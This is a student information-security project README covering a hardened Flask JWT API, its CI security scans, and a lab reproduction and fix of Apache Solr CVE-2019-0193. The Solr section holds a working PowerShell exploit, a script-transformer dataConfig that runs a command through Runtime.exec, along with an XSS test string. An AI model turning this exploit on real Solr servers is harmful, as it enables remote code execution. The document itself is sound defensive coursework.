# Work 1 Secure REST API and CVE Analysis

This project implements HDU Information Security Work 1: an authenticated Flask REST API with PostgreSQL, automated security checks in GitHub Actions, and a controlled Apache Solr CVE-2019-0193 experiment.

- Public repository: https://github.com/Wang3D/hdu_is_work1
- Documented successful CI run: https://github.com/Wang3D/hdu_is_work1/actions/runs/39550839549
- Evidence baseline: run 9, commit `9e3abce324c719a703bdec4cc760f648b556528e`, triggered by a push to main on 21 October 2026.
- Applied CVE fix files: `cve-fix/CVE-2019-0193-fixed/`.

## Recorded results

| Check | Result |
| --- | --- |
| API | Login, denied access without a token, protected reads and writes, and escaped text demonstrated locally |
| Initial dependency audit | 20 known vulnerabilities in four packages |
| Dependency audit after upgrades | No known vulnerabilities found in CI run 9 |
| Automated tests | 3 passed in 1.10 seconds in CI run 9 |
| Bandit | One Low-severity, Medium-confidence B106 false positive; zero Medium or High findings |
| CVE before replacement | Solr 8.1.1 accepted the request and created /tmp/success |
| CVE after replacement | Solr 8.11.0 returned HTTP 404; marker absent; admin page HTTP 200 |

Bandit is not a zero-finding scan. The workflow uses `--exit-zero` for reporting, so findings at any severity do not fail that step. pip-audit and pytest retain normal failure behavior.

## Environment and local setup

The original local experiments used Windows, PowerShell, Python 3.9.13 and PostgreSQL 17. The current pins were validated in GitHub Actions on Python 3.12.15 with a separate PostgreSQL 16 service. Use Python 3.12 for a fresh environment with the current requirements.

Current pins: Flask 3.1.3, PyJWT 2.15.0, bcrypt 4.2.1, psycopg with binary support 3.2.3, python-dotenv 1.2.2, pytest 9.0.3 and Bandit 1.8.0.

Reuse the existing local database and ignored `.env`. With PostgreSQL running, start from the repository root:

```powershell
.\.venv\Scripts\python.exe manage.py init-db
.\Start.ps1
```

For a fresh environment, run Setup.ps1 with the Python 3.12 executable path:

```powershell
.\Setup.ps1 -Python 'C:\path\to\Python312\python.exe'
```

Setup creates the virtual environment if absent. It reuses an existing .venv; passing -Python does not migrate that environment to another interpreter. Use a fresh Python 3.12 environment when installing the final pins. If `.env` is absent, it offers database setup. If the dedicated database already exists, configure `.env` for it instead of recreating it. The helper refuses to overwrite existing configuration or alter an existing database or role.

The local role `work1_app` is a non-superuser without CREATE DATABASE or CREATE ROLE privileges. It owns its database and therefore has schema privileges within it. Local database credentials and the JWT secret stay in ignored `.env`. The hosted CI service uses disposable test credentials and does not connect to this local database.

Create the student account once; the command prompts for a password:

```powershell
.\.venv\Scripts\python.exe manage.py create-user --login student
```

For an existing login, reuse the account. Creating it again produces a unique-constraint error.

## API and requests

Base URL: `http://127.0.0.1:5000`.

| Endpoint | Access | Successful result |
| --- | --- | --- |
| POST /auth/login | JSON login and password | JWT, token_type Bearer, lifetime 900 seconds by default |
| GET /api/data | Valid Bearer JWT | Notes owned by the authenticated subject |
| POST /api/data | Valid Bearer JWT and JSON content | New note with HTTP 201 |
| GET /health | Public | Process availability; no database readiness check |

```powershell
$credential = Get-Credential -UserName student -Message 'Work 1 API login'
$loginBody = @{
    login = $credential.UserName
    password = $credential.GetNetworkCredential().Password
} | ConvertTo-Json
$login = Invoke-RestMethod 'http://127.0.0.1:5000/auth/login' `
    -Method Post -ContentType 'application/json' -Body $loginBody
$headers = @{ Authorization = 'Bearer ' + $login.access_token }
Invoke-RestMethod 'http://127.0.0.1:5000/api/data' -Headers $headers
Invoke-RestMethod 'http://127.0.0.1:5000/api/data' `
    -Method Post -Headers $headers -ContentType 'application/json' `
    -Body (@{ content = '<script>alert(1)</script>' } | ConvertTo-Json)
```

GET /api/data without a token returned HTTP 401. Authenticated creation and retrieval succeeded. Script text was returned as `&lt;script&gt;alert(1)&lt;/script&gt;`. An injection-style login was rejected; parameterized SQL in the source is the principal SQLi defense.

![Unauthenticated request rejected with HTTP 401](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20111325.png)

![Script input escaped in API responses](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20111628.png)

## Security implementation

- SQLi: psycopg binds login, owner and content values separately from SQL using placeholders; user input is not concatenated into SQL text.
- Ownership: the owner identifier comes from the verified JWT subject; reads filter by that same subject.
- XSS: `html.escape(..., quote=True)` escapes note text on both creation and retrieval. Clients should render it as text.
- Passwords: bcrypt generates salted digests; bcrypt.checkpw verifies them. Plaintext passwords are not stored.
- Authentication: HS256 tokens contain sub, login, iss, aud, iat and exp. Middleware restricts the algorithm and verifies the signature, issuer, audience and expiry when present.
- Validation: login characters and length are restricted; note content is limited to 1 to 500 characters; credential errors are generic.

Remaining improvements include explicit required JWT claims, negative-token and two-user authorization tests, and reconciling the 128-character password validator with bcrypt 4.2.1's 72-byte limit.

## Follow-up changes on 21 October 2026

The final submission moved from the local-only plan to a public GitHub repository and hosted GitHub Actions. The follow-up work added a PostgreSQL service with SCRAM authentication, upgraded four vulnerable dependency pins, upgraded the checkout/setup-python/upload-artifact actions, added a pip upgrade, and retained the Bandit JSON artifact. Removing the old Bandit severity filter caused run 8 to fail on B106; run 9 retained the detailed finding with `-l --exit-zero` and completed the audit and tests successfully.

The lab's SCA objective is implemented with pip-audit rather than the named OWASP Dependency-Check or Snyk examples. API evidence uses PowerShell HTTP requests rather than Postman or curl. These choices and the exact scope of each result are documented in the English report.

## Hosted CI and dependency remediation

The workflow triggers on push and pull_request. It starts a PostgreSQL 16 service with explicit SCRAM initialization, sets test environment variables, selects Python 3.12, upgrades pip, installs requirements, runs Bandit, uploads its report, runs pip-audit and executes pytest.

The initial audit found 20 entries across Flask 3.1.0, PyJWT 2.10.1, python-dotenv 1.0.1 and pytest 8.3.4. Their pins were upgraded to 3.1.3, 2.15.0, 1.2.2 and 9.0.3 respectively. The hosted rerun reported `No known vulnerabilities found`; all three tests passed. This is the result for the audited requirements at that time, not a guarantee against unknown or future vulnerabilities.

The exact Bandit command is:

```text
bandit -r app manage.py run.py -l --exit-zero -f json -o bandit-report.json
```

The report records B106 at app/api.py, starting at line 36 and spanning lines 36 to 40, including `token_type="Bearer"`. Bearer is the authentication scheme label, not a hardcoded password or JWT secret. Severity is LOW and confidence is MEDIUM. No nosec suppression was used. Because exit-zero applies to all severities, this preserves findings but does not enforce a Bandit failure threshold.

Download `bandit-report` from the documented run's Summary page. SCA and test evidence remain in the job logs. The workflow performs checks and contains no deployment stage.

The current CI-only JWT string is shorter than the application's 32-character issuance requirement. The three tests do not exercise token issuance; a CI login integration test would need a suitable test secret first.

![Public repository and main branch](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135002.png)

![Successful CI run 9](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135038.png)

![Successful job steps](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135113.png)

![Dependency audit after upgrades](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135143.png)

![Three passing hosted tests](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135221.png)

![Bandit total metrics](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135638.png)

![Detailed B106 false positive for Bearer](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-21%20135646.png)

## CVE-2019-0193 reproduction

The selected vulnerability is Apache Solr DataImportHandler remote code execution. The vulnerable environment uses `vulhub/solr:8.1.1`; the replacement uses `vulhub/solr:8.11.0`.

From the repository root, keep these paths in the same PowerShell session:

```powershell
$projectRoot = (Get-Location).Path
$vulnerablePath = Join-Path (Split-Path $projectRoot -Parent) `
    'vulhub\solr\CVE-2019-0193'
Set-Location -LiteralPath $vulnerablePath
docker compose up -d
docker compose ps
docker compose exec -T solr sh -c 'ls -l /tmp/success'
```

This uses the sibling Vulhub checkout from the experiment. If absent, obtain the official Vulhub repository and use its solr/CVE-2019-0193 directory. Before the recorded attack, the marker was absent, the dashboard identified Solr 8.1.1 and demo contained 46 documents.

The following request sends the script transformer used in the experiment. Its harmless proof command creates an empty marker inside the lab container.

```powershell
$config = @'
<dataConfig>
  <script><![CDATA[
    function poc() {
      java.lang.Runtime.getRuntime().exec("touch /tmp/success");
    }
  ]]></script>
  <document>
    <entity name="sample"
            fileName=".*"
            baseDir="/"
            processor="FileListEntityProcessor"
            recursive="false"
            transformer="script:poc" />
  </document>
</dataConfig>
'@

$form = @{
    command = 'full-import'
    verbose = 'false'
    clean = 'false'
    commit = 'true'
    debug = 'true'
    core = 'demo'
    dataConfig = $config
    name = 'dataimport'
}
```

```powershell
$body = (
    $form.GetEnumerator() | ForEach-Object {
        [uri]::EscapeDataString([string]$_.Key) + '=' +
        [uri]::EscapeDataString([string]$_.Value)
    }
) -join '&'

$uri = 'http://127.0.0.1:8983/solr/demo/dataimport?indent=on&wt=json'
$response = Invoke-WebRequest -Uri $uri `
    -Method Post -ContentType 'application/x-www-form-urlencoded' `
    -Body $body -UseBasicParsing -TimeoutSec 30
[pscustomobject]@{
    StatusCode = $response.StatusCode
    Response = $response.Content
}
```

After the request:

```powershell
docker compose exec -T solr sh -c 'ls -l /tmp/success'
Invoke-WebRequest `
    'http://127.0.0.1:8983/solr/demo/select?q=*:*&wt=json' `
    -UseBasicParsing
```

The request returned HTTP 200, the marker existed, and a normal query returned HTTP 200 with 46 documents. The marker, rather than HTTP success alone, establishes command execution.

![Solr 8.1.1 dashboard](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20112847.png)

![Script transformer and request form](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20113410.png)

![Vulnerable request returned HTTP 200](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20113431.png)

![Proof file created in the vulnerable container](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20113512.png)

## Root cause and applied fix

The unauthenticated HTTP dataConfig parameter supplied an import configuration containing a script transformer. DataImportHandler treated request-controlled configuration as executable configuration. The script invoked Java runtime functionality with the Solr process's permissions.

[Apache SOLR-13669](https://issues.apache.org/jira/browse/SOLR-13669) describes a vendor control in Solr 8.2.0: request-parameter use requires explicit enabling through `enable.dih.dataConfigParam`. It also describes an invariant empty dataConfig and access restricted to trusted traffic. See [NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-0193) and the [Vulhub example](https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193).

The retained fix changes the Compose image from `vulhub/solr:8.1.1` to `vulhub/solr:8.11.0`. There is no custom source patch or explicit DIH configuration edit.

```powershell
Set-Location -LiteralPath $vulnerablePath
docker compose down
Set-Location -LiteralPath (Join-Path $projectRoot `
    'cve-fix\CVE-2019-0193-fixed')
docker compose up --build -d
docker compose ps
```

The file references a prebuilt image, so --build does not compile a custom patched image. Repeat the identical payload. To avoid displaying an old response after an HTTP error:

```powershell
$response = $null
try {
    $response = Invoke-WebRequest -Uri $uri -Method Post `
        -ContentType 'application/x-www-form-urlencoded' -Body $body `
        -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
    $pocStatus = [int]$response.StatusCode
} catch {
    if ($null -eq $_.Exception.Response) { throw }
    $pocStatus = [int]$_.Exception.Response.StatusCode
}
$pocStatus
docker compose exec -T solr sh -c `
    'if test -e /tmp/success; then echo proof-present; else echo proof-absent; fi'
(Invoke-WebRequest 'http://127.0.0.1:8983/solr/' `
    -UseBasicParsing).StatusCode
```

Recorded replacement results were HTTP 404 for the same attack path, proof-absent, and admin HTTP 200. Its dashboard showed Solr 8.11.0 and demo with 46 documents. A separate normal select response after replacement was not captured, so regression evidence covers administration availability and core presence. The 404 does not isolate the vendor parameter guard from changed packaged DIH configuration.

![Solr 8.11.0 dashboard](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20120213.png)

![Identical proof request returned HTTP 404](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20121236.png)

![Proof file absent after replacement](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20121323.png)

![Administration interface returned HTTP 200](screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-10-20%20121354.png)

The retained port mappings publish on all interfaces, despite requests using 127.0.0.1. Explicit loopback binding and removing the debug port are recommended hardening, not part of the recorded fix. Solr 8.11.0 is a historical comparison image, not a generally secure production release.

## Evidence files

The screenshots folder contains 33 original local experiment images and seven additional GitHub and Bandit images. This README embeds representative evidence. Consecutive long outputs remain as separate originals. The English Word report contains all 40 images, editable listings, eight control-question answers and the fix files.
